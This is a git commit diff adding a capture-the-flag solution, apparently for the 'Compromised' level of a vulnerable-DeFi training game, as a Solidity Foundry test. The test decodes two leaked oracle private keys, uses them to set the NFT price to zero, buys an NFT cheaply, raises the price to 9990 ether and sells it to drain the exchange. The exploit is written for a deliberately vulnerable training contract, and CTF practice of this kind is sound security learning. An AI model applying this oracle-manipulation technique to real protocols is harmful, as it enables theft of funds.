d9838ff4f1d782aea1857fe3b273ccd8dd1bf82f
0xfarhaan <farhaan@maple.finance>
2022-11-12 22:43:32 +0000

    feat: Compromised Exploit

--- test/Levels/compromised/Compromised.t.sol
+++ test/Levels/compromised/Compromised.t.sol
@@ -74,8 +74,97 @@ contract Compromised is Test {
         console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
     }
 
+    function decode(string memory _str) internal pure returns (string memory) {
+        require( (bytes(_str).length % 4) == 0, "Length not multiple of 4");
+        bytes memory _bs = bytes(_str);
+
+        uint i = 0;
+        uint j = 0;
+        uint dec_length = (_bs.length/4) * 3;
+        bytes memory dec = new bytes(dec_length);
+
+        for (; i< _bs.length; i+=4 ) {
+            (dec[j], dec[j+1], dec[j+2]) = dencode4(
+                bytes1(_bs[i]),
+                bytes1(_bs[i+1]),
+                bytes1(_bs[i+2]),
+                bytes1(_bs[i+3])
+            );
+            j += 3;
+        }
+        while (dec[--j]==0)
+            {}
+
+        bytes memory res = new bytes(j+1);
+        for (i=0; i<=j;i++)
+            res[i] = dec[i];
+
+        return string(res);
+    }
+
+    function dencode4 (bytes1 b0, bytes1 b1, bytes1 b2, bytes1 b3) private pure returns (bytes1 a0, bytes1 a1, bytes1 a2)
+    {
+        uint pos0 = charpos(b0);
+        uint pos1 = charpos(b1);
+        uint pos2 = charpos(b2)%64;
+        uint pos3 = charpos(b3)%64;
+
+        a0 = bytes1(uint8(( pos0 << 2 | pos1 >> 4 )));
+        a1 = bytes1(uint8(( (pos1&15)<< 4 | pos2 >> 2)));
+        a2 = bytes1(uint8(( (pos2&3)<< 6 | pos3 )));
+    }
+
+    function charpos(bytes1 char) private pure returns (uint pos) {
+        bytes memory base64urlchars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_=";
+        for (; base64urlchars[pos] != char; pos++)
+            {}    //for loop body is not necessary
+        require (base64urlchars[pos]==char, "Illegal char in string");
+        return pos;
+    }
+
+
     function testExploit() public {
         /** EXPLOIT START **/
+
+        // NOTE: Key with this exploit was to use the leaked private keys to manipulate the oracle price to drain the funds from the exchange
+        // note the conversion of the private key from bytes -> base64 -> utf-8 -> uint256 -> address
+
+        string memory base64key1 = string(bytes(hex"4d48686a4e6a63345a575978595745304e545a6b59545931597a5a6d597a55344e6a466b4e4451344f544a6a5a475a68597a426a4e6d4d34597a49314e6a42695a6a426a4f575a69593252685a544a6d4e44637a4e574535"));
+        string memory base64key2 = string(bytes(hex"4d4867794d4467794e444a6a4e4442685932526d59546c6c5a4467344f5755324f44566a4d6a4d314e44646859324a6c5a446c695a575a6a4e6a417a4e7a466c4f5467334e575a69593251334d7a597a4e444269596a5134"));
+
+        string memory address1 = decode(base64key1);
+        string memory address2 = decode(base64key2);
+
+        // Derived from decode above
+        uint256[2] memory keys = [0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9, 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48];
+
+
+        vm.prank(vm.addr(keys[0]));
+        trustfulOracle.postPrice("DVNFT", 0);
+
+        vm.prank(vm.addr(keys[1]));
+        trustfulOracle.postPrice("DVNFT", 0);
+
+        vm.prank(attacker);
+        uint256 id = exchange.buyOne{value: 1}();
+
+        vm.prank(vm.addr(keys[0]));
+        trustfulOracle.postPrice("DVNFT", 9990 ether);
+
+        vm.prank(vm.addr(keys[1]));
+        trustfulOracle.postPrice("DVNFT", 9990 ether);
+
+        vm.startPrank(attacker);
+	    damnValuableNFT.approve(address(exchange), id);
+	    exchange.sellOne(id);
+	    vm.stopPrank();
+
+        vm.prank(vm.addr(keys[0]));
+        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+
+        vm.prank(vm.addr(keys[1]));
+        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+
 
         /** EXPLOIT END **/
         validation();
